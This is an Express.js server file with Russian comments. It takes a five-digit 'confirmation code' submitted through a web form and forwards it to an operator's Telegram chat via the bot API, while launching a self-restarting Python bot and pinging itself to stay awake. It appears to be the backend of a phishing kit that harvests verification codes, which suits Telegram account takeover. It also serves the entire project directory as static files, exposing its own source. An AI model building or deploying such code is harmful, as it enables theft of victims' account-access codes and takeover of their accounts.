const express = require('express');
const path = require('path');
const { spawn } = require('child_process');
const https = require('https');
const http = require('http');

const app = express();

// Middleware для обработки JSON и данных с форм
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Раздаем статические файлы прямо из КОРНЯ проекта
app.use(express.static(__dirname));

// 2. Отдаем index.html при заходе на главный адрес
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 3. Эндпоинт пинга (защита от засыпания)
app.get('/ping', (req, res) => {
    res.status(200).send('OK');
});

// ===== 4. ЭНДПОИНТ ДЛЯ ПРИЕМА И ОТПРАВКИ 5-ЗНАЧНОГО КОДА =====
// Укажите ваш Token и Chat ID
const BOT_TOKEN = process.env.BOT_TOKEN || 'ВАШ_ТОКЕН_БОТА';
const CHAT_ID = process.env.CHAT_ID || 'ВАШ_CHAT_ID';

app.post('/send-code', (req, res) => {
    const { code } = req.body;

    // Валидация: проверяем, что код состоит строго из 5 цифр
    if (!code || !/^\d{5}$/.test(code.toString().trim())) {
        return res.status(400).json({ 
            success: false, 
            error: 'Код должен состоять ровно из 5 цифр' 
        });
    }

    const cleanCode = code.toString().trim();
    console.log(`[SERVER]: Получен 5-значный код: ${cleanCode}`);

    // Отправка кода в Telegram чат
    const message = encodeURIComponent(`🔑 Получен код подтверждения: ${cleanCode}`);
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;

    https.get(telegramUrl, (apiRes) => {
        let data = '';
        apiRes.on('data', chunk => data += chunk);
        apiRes.on('end', () => {
            console.log(`[TELEGRAM RESPONSE]: ${data}`);
            res.json({ success: true, message: 'Код успешно отправлен!' });
        });
    }).on('error', (err) => {
        console.error(`[TELEGRAM ERROR]: ${err.message}`);
        res.status(500).json({ success: false, error: 'Ошибка отправки сообщения в Telegram' });
    });
});

// ===== 5. ФУНКЦИЯ ЗАПУСКА PYTHON БОТА =====
function startTelegramBot() {
    const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';
    console.log(`🚀 Запуск бота: ${pythonCmd} bot.py...`);

    const botProcess = spawn(pythonCmd, ['bot.py']);

    botProcess.stdout.on('data', (data) => {
        console.log(`[BOT]: ${data.toString().trim()}`);
    });

    botProcess.stderr.on('data', (data) => {
        console.error(`[BOT ERROR]: ${data.toString().trim()}`);
    });

    botProcess.on('close', (code) => {
        console.log(`[BOT] Процесс завершился с кодом ${code}`);
        console.log('🔄 Перезапуск бота через 3 секунды...');
        setTimeout(startTelegramBot, 3000);
    });
}

// Запускаем bot.py
startTelegramBot();

// ===== 6. ВНУТРЕННИЙ АВТО-ПИНГ (Каждые 10 минут) =====
const SITE_URL = process.env.RENDER_EXTERNAL_URL;

if (SITE_URL) {
    setInterval(() => {
        const client = SITE_URL.startsWith('https') ? https : http;
        client.get(`${SITE_URL}/ping`, (res) => {
            console.log(`[KEEP-ALIVE]: Пинг отправлен (${res.statusCode})`);
        }).on('error', (err) => {
            console.error(`[KEEP-ALIVE ERROR]: ${err.message}`);
        });
    }, 10 * 60 * 1000);
}

// ===== ЗАПУСК СЕРВЕРА =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🌐 Сервер запущен на порту ${PORT}`);
});
